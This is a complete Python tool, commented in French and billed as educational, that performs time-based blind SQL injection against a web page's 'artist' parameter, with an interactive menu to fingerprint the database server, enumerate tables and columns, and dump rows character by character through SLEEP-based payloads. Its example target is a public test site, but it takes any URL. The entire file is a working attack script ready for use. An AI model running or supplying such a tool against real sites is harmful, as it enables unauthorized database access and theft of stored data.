#!/usr/bin/env python3
"""
Script Naïf Time-Based Blind SQL Injection Intelligent
---------------------------------------------------------
Ce script utilise des injections basées sur le temps pour extraire des informations
de la cible (à usage pédagogique uniquement) et met en cache :
  - Le banner du SGBD et le type (MySQL ou PostgreSQL)
  - Le nom de la base de données (normalisé en minuscules)
  - Le nombre et les noms des tables
  - La liste des colonnes pour chaque table (lorsqu'extraites)
  - Le dump (quelques lignes) d'une table sélectionnée

Le menu interactif permet d'exécuter ces actions sans devoir re-scanner les informations déjà
extraites.
"""

import time
import requests
import sys

# Tente d'importer Rich pour un affichage amélioré
try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.table import Table as RichTable
    from rich import box
    console = Console()
    use_rich = True
except ImportError:
    use_rich = False

# ---------------------------
# Paramètres globaux
# ---------------------------
# Charset étendu (inclut lettres, chiffres, symboles et l'espace)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}[]()-=+!@#$%^&*:;/?><,.'\" "

delay = 5.0         # Durée du SLEEP utilisée dans les conditions (en secondes)
MAX_LENGTH = 50     # Longueur maximale à extraire pour éviter des boucles infinies

# Dictionnaire de cache pour éviter de re-scanner inutilement
cache = {
    "dbname": None,
    "banner": None,
    "dbms": None,
    "tables": {},    # format: {table_index: table_name}
    "columns": {}    # format: {table_name: [col1, col2, ...]}
}

# ---------------------------
# FONCTIONS D'AFFICHAGE & SAISIE
# ---------------------------
def print_info(msg):
    if use_rich:
        console.print(f"[cyan][*][/cyan] {msg}")
    else:
        print(f"[*] {msg}")

def print_warn(msg):
    if use_rich:
        console.print(f"[yellow][!][/yellow] {msg}")
    else:
        print(f"[!] {msg}")

def print_found(msg):
    if use_rich:
        console.print(f"[green]{msg}[/green]")
    else:
        print(msg)

def input_str(msg):
    if use_rich:
        return Prompt.ask(msg)
    else:
        return input(msg + ": ")

# ---------------------------
# 1) FONCTIONS COMMUNES TIME-BASED
# ---------------------------
def measure_time(url, payload):
    """
    Envoie une requête GET avec le paramètre 'artist' = payload et retourne le temps de réponse.
    """
    params = {"artist": payload}
    start_time = time.time()
    try:
        response = requests.get(url, params=params, timeout=delay + 5)  # Timeout ajusté
    except requests.RequestException:
        return 0.0
    return time.time() - start_time

def check_condition(url, payload, delay):
    """
    Retourne True si la requête a duré au moins 'delay' secondes, sinon False.
    """
    elapsed = measure_time(url, payload)
    return elapsed >= delay

def extract_string(url, query, delay, max_length=MAX_LENGTH):
    """
    Extrait une chaîne de caractères issue de l'exécution de 'query' (ex: DATABASE(), table_name, column_name)
    en testant caractère par caractère via SUBSTRING().
    
    La requête utilisée est de la forme :
         1 AND IF(SUBSTRING((query), pos, 1) = 'c', SLEEP(delay), 0)
    
    IMPORTANT : Pour éviter des boucles infinies dues à l'ajout répétitif d'espaces en fin,
               si un espace est trouvé alors que le résultat est déjà non vide,
               on considère que c'est la fin de la chaîne.
    """
    result = ""
    pos = 1
    while pos <= max_length:
        found = False
        for ch in charset:
            payload_ = f"1 AND IF(SUBSTRING(({query}),{pos},1)='{ch}', SLEEP({delay}),0)"
            if check_condition(url, payload_, delay):
                # Si on trouve un espace et que le résultat n'est pas vide, terminer
                if ch == " " and result != "":
                    found = False
                    break
                result += ch
                print_found(f"pos {pos}: Found '{ch}' => so far: '{result}'")
                found = True
                break
        if not found:
            break
        pos += 1
    return result.strip()

# ---------------------------
# 2) EXTRACTION DU BANNER & DÉTECTION DU SGBD
# ---------------------------
def get_banner_and_dbms(url, delay):
    """
    Tente de récupérer le banner du SGBD et déduire le type.
    Pour MySQL, on utilise @@version et pour PostgreSQL version().
    Renvoie un tuple (banner, dbms_type).
    """
    print_info("Retrieving DBMS banner via time-based injection...")
    
    # Test avec MySQL
    banner_mysql = extract_string(url, "@@version", delay)
    if banner_mysql:
        if "mysql" in banner_mysql.lower():
            cache["banner"] = banner_mysql
            cache["dbms"] = "MySQL"
            print_found(f"[BANNER] => {banner_mysql}")
            return banner_mysql, "MySQL"
        else:
            # Peut-être un autre SGBD avec un banner similaire
            cache["banner"] = banner_mysql
            cache["dbms"] = "Unknown"
            print_found(f"[BANNER] (unexpected content) => {banner_mysql}")
            return banner_mysql, "Unknown"
    
    # Test avec PostgreSQL
    banner_pg = extract_string(url, "version()", delay)
    if banner_pg:
        if "postgres" in banner_pg.lower():
            cache["banner"] = banner_pg
            cache["dbms"] = "PostgreSQL"
            print_found(f"[BANNER] => {banner_pg}")
            return banner_pg, "PostgreSQL"
        else:
            cache["banner"] = banner_pg
            cache["dbms"] = "Unknown"
            print_found(f"[BANNER] (unknown) => {banner_pg}")
            return banner_pg, "Unknown"
    
    print_warn("No DBMS banner detected.")
    return "", "Unknown"

# ---------------------------
# 3) EXTRACTION DU NOM DE LA BASE DE DONNÉES
# ---------------------------
def get_database_name(url, delay):
    """
    Extrait le nom de la base de données.
    Tente d'abord DATABASE() (MySQL) puis current_database() (PostgreSQL).
    Le résultat est normalisé en minuscules et nettoyé des espaces en excès.
    """
    print_info("Retrieving database name via time-based injection...")
    db = extract_string(url, "DATABASE()", delay)
    if db:
        db = db.lower().strip()
        cache["dbname"] = db
        print_found(f"DATABASE() => {db}")
        return db
    db = extract_string(url, "current_database()", delay)
    if db:
        db = db.lower().strip()
        cache["dbname"] = db
        print_found(f"current_database() => {db}")
        return db
    print_warn("Unable to extract database name.")
    return ""

# ---------------------------
# 4) EXTRACTION DES NOMS DES TABLES
# ---------------------------
def get_table_count(url, db_name, delay, max_tables=50):
    """
    Renvoie le nombre de tables dans la base de données db_name.
    """
    print_info("Counting tables in the database...")
    for cnt in range(1, max_tables + 1):
        payload = f"1 AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}')={cnt}, SLEEP({delay}),0)"
        if check_condition(url, payload, delay):
            print_found(f"Table count = {cnt}")
            return cnt
    print_warn("Table count not determined (exceeded max_tables).")
    return 0

def get_table_name(url, db_name, index, delay):
    """
    Extrait le nom de la table d'indice 'index' (0-based) depuis information_schema.tables.
    """
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {index},1"
    print_info(f"Retrieving table #{index + 1} name...")
    tname = extract_string(url, query, delay)
    return tname.strip()

# ---------------------------
# 5) EXTRACTION DES COLONNES
# ---------------------------
def get_column_count(url, db_name, table_name, delay, max_cols=50):
    """
    Renvoie le nombre de colonnes pour la table table_name.
    """
    print_info(f"Counting columns in table '{table_name}'...")
    for cnt in range(1, max_cols + 1):
        payload = (f"1 AND IF((SELECT COUNT(*) FROM information_schema.columns "
                   f"WHERE table_schema='{db_name}' AND table_name='{table_name}')={cnt}, SLEEP({delay}),0)")
        if check_condition(url, payload, delay):
            print_found(f"Column count in '{table_name}' = {cnt}")
            return cnt
    print_warn("Column count not determined (exceeded max_cols).")
    return 0

def get_column_name(url, db_name, table_name, index, delay):
    """
    Extrait le nom de la colonne d'indice 'index' (0-based) depuis information_schema.columns.
    """
    query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table_name}' LIMIT {index},1"
    print_info(f"Retrieving column #{index + 1} name from table '{table_name}'...")
    colname = extract_string(url, query, delay)
    return colname.strip()

# ---------------------------
# 6) EXTRACTION DES VALEURS (DUMP)
# ---------------------------
def get_row_count(url, db_name, table_name, delay, max_rows=50):
    """
    Renvoie le nombre de lignes dans la table table_name.
    """
    print_info(f"Counting rows in table '{table_name}'...")
    for r in range(1, max_rows + 1):
        payload = f"1 AND IF((SELECT COUNT(*) FROM `{db_name}`.`{table_name}`)={r}, SLEEP({delay}),0)"
        if check_condition(url, payload, delay):
            print_found(f"Row count in '{table_name}' = {r}")
            return r
    print_warn("Row count not determined (exceeded max_rows).")
    return 0

def get_cell_value(url, db_name, table_name, column_name, row_index, delay):
    """
    Extrait la valeur de la cellule (row_index, column_name) via SUBSTRING.
    """
    query = f"SELECT `{column_name}` FROM `{db_name}`.`{table_name}` LIMIT {row_index},1"
    print_info(f"Extracting value for '{column_name}', row {row_index + 1}...")
    cell_val = extract_string(url, query, delay)
    return cell_val.strip()

def dump_table_data(url, db_name, table_name, columns, delay, max_rows_dump=3):
    """
    Extrait et affiche jusqu'à max_rows_dump lignes de la table table_name.
    """
    row_count = get_row_count(url, db_name, table_name, delay)
    if row_count == 0:
        print_warn(f"No rows found in '{table_name}'. Skipping dump.")
        return
    limit = min(row_count, max_rows_dump)
    print_info(f"Dumping up to {limit} row(s) from '{table_name}'...\n")
    for r in range(limit):
        row_data = {}
        for col in columns:
            row_data[col] = get_cell_value(url, db_name, table_name, col, r, delay)
        # Affichage formaté
        if use_rich:
            row_str = " | ".join(f"{k}={v}" for k, v in row_data.items())
            print_found(f"[Row {r + 1}] {row_str}")
        else:
            print_found(f"[Row {r + 1}] => {row_data}")
    print("")

# ---------------------------
# 7) MENU INTERACTIF
# ---------------------------
def display_menu():
    print("\nOptions disponibles:")
    print("  1 - Extraire le nom de la base de données")
    print("  2 - Extraire le banner DBMS et détecter le type")
    print("  3 - Lister les tables et colonnes")
    print("  4 - Dump du contenu d'une table")
    print("  q - Quitter")
    return input_str("Votre choix").strip().lower()

# ---------------------------
# 8) PROGRAMME PRINCIPAL
# ---------------------------
def main():
    if use_rich:
        console.rule("[bold yellow]Naïf Time-Based Blind SQLi Scanner[/bold yellow]")
    else:
        print("=== Naïf Time-Based Blind SQLi Scanner ===")
    
    # Saisie de l'URL cible et du délai
    target_url = input_str("Entrez l'URL cible (ex: http://testphp.vulnweb.com/artists.php)")
    if not target_url.startswith("http"):
        print_warn("L'URL doit commencer par http:// ou https://")
        sys.exit(1)
    try:
        delay_val = float(input_str("Entrez le délai (ex: 2.0)"))
    except ValueError:
        print_warn("Délai invalide, utilisation de 2.0")
        delay_val = 2.0
    print_info(f"Cible = {target_url} | Délai = {delay_val} sec")
    
    # Boucle du menu interactif
    while True:
        choice = display_menu()
        if choice in ('q', 'quit'):
            print_info("Au revoir.")
            sys.exit(0)
        elif choice == '1':
            # Extraction du nom de la base de données
            if cache["dbname"]:
                print_found(f"[DB NAME] (cache) : {cache['dbname']}")
            else:
                dbname = get_database_name(target_url, delay_val)
                cache["dbname"] = dbname
                if dbname:
                    print_found(f"[DB NAME] : {dbname}")
                else:
                    print_warn("Échec de l'extraction du nom de la base.")
        elif choice == '2':
            # Extraction du banner DBMS et du type
            if cache["banner"] and cache["dbms"]:
                print_found(f"[BANNER] (cache) : {cache['banner']}")
                print_found(f"[DBMS] (cache) : {cache['dbms']}")
            else:
                banner, dbms = get_banner_and_dbms(target_url, delay_val)
                cache["banner"] = banner
                cache["dbms"] = dbms
                if banner:
                    print_found(f"[BANNER] : {banner}")
                else:
                    print_warn("Aucun banner détecté.")
                print_found(f"[DBMS] : {dbms}")
        elif choice == '3':
            # Liste des tables et colonnes
            if not cache["dbname"]:
                print_warn("Le nom de la base de données n'est pas encore extrait. Veuillez choisir l'option 1 d'abord.")
                continue
            dbname = cache["dbname"]
            
            if cache["tables"]:
                print_found("[TABLES] (cache) :")
                for idx, tname in cache["tables"].items():
                    print_found(f"  [{idx + 1}] {tname}")
            else:
                # Extraction du nombre de tables
                tcount = get_table_count(target_url, dbname, delay_val)
                if tcount == 0:
                    print_warn("Aucune table trouvée ou impossible de déterminer le nombre de tables.")
                    continue
                print_info(f"Nombre de tables dans '{dbname}' : {tcount}")
                # Extraction des noms de tables
                tables = []
                print_info("Extraction des noms de tables...")
                for i in range(tcount):
                    tname = get_table_name(target_url, dbname, i, delay_val)
                    tables.append(tname)
                    cache["tables"][i] = tname
                    print_found(f"[TABLE #{i + 1}] => {tname}")
                # Extraction des colonnes pour chaque table
                table_cols = {}
                for t in tables:
                    if t in cache["columns"]:
                        cols = cache["columns"][t]
                    else:
                        ccount = get_column_count(target_url, dbname, t, delay_val)
                        if ccount > 0:
                            cols = []
                            for idx in range(ccount):
                                col = get_column_name(target_url, dbname, t, idx, delay_val)
                                cols.append(col)
                            cache["columns"][t] = cols
                        else:
                            cols = []
                            cache["columns"][t] = cols
                    table_cols[t] = cache["columns"][t]
                # Affichage sous forme de tableau avec Rich
                if use_rich:
                    rich_table = RichTable(title="Tables & Colonnes", box=box.MINIMAL_DOUBLE_HEAD)
                    rich_table.add_column("Table", style="magenta", no_wrap=True)
                    rich_table.add_column("Colonnes", style="green")
                    for tab, col_list in table_cols.items():
                        rich_table.add_row(tab, ", ".join(col_list) if col_list else "No columns found")
                    console.print(rich_table)
                else:
                    print_info("Tables & Colonnes :")
                    for tab, col_list in table_cols.items():
                        print_found(f"{tab} => {col_list if col_list else 'No columns found'}")
        elif choice == '4':
            # Dump du contenu d'une table
            if not cache["dbname"]:
                print_warn("Le nom de la base de données n'est pas encore extrait. Veuillez choisir l'option 1 d'abord.")
                continue
            dbname = cache["dbname"]
            
            if not cache["tables"]:
                # Extraction du nombre de tables si non encore fait
                tcount = get_table_count(target_url, dbname, delay_val)
                if tcount == 0:
                    print_warn("Aucune table trouvée ou impossible de déterminer le nombre de tables.")
                    continue
                # Extraction des noms de tables
                tables = []
                print_info("Extraction des noms de tables...")
                for i in range(tcount):
                    tname = get_table_name(target_url, dbname, i, delay_val)
                    tables.append(tname)
                    cache["tables"][i] = tname
                    print_found(f"[TABLE #{i + 1}] => {tname}")
            else:
                tables = list(cache["tables"].values())
            
            if not tables:
                print_warn("Aucune table trouvée.")
                continue
            
            # Affichage des tables dans un tableau avec Rich
            if use_rich:
                tables_table = RichTable(title="Liste des Tables", box=box.MINIMAL_DOUBLE_HEAD)
                tables_table.add_column("Index", style="cyan", no_wrap=True)
                tables_table.add_column("Table")
                for idx, t in enumerate(tables, start=1):
                    tables_table.add_row(str(idx), t)
                console.print(tables_table)
            else:
                print_info("Liste des tables disponibles :")
                for idx, t in enumerate(tables, start=1):
                    print_found(f"  {idx}. {t}")
            
            # Choix de la table à dumper
            try:
                sel = int(input_str("Entrez l'index de la table à dumper"))
                if sel < 1 or sel > len(tables):
                    print_warn("Index invalide.")
                    continue
            except ValueError:
                print_warn("Choix invalide.")
                continue
            table_to_dump = tables[sel - 1]
            print_info(f"Dump du contenu de la table '{table_to_dump}'...")
            
            # Extraction des colonnes si non encore fait
            if table_to_dump in cache["columns"] and cache["columns"][table_to_dump]:
                cols = cache["columns"][table_to_dump]
            else:
                ccount = get_column_count(target_url, dbname, table_to_dump, delay_val)
                if ccount == 0:
                    print_warn("Aucune colonne trouvée pour cette table.")
                    continue
                cols = []
                for idx in range(ccount):
                    col = get_column_name(target_url, dbname, table_to_dump, idx, delay_val)
                    cols.append(col)
                cache["columns"][table_to_dump] = cols
            print_found(f"Colonnes de '{table_to_dump}' : {cols}")
            
            # Dump des données
            dump_table_data(target_url, dbname, table_to_dump, cols, delay_val, max_rows_dump=3)
        else:
            print_warn("Option non reconnue.")

if __name__ == "__main__":
    main()
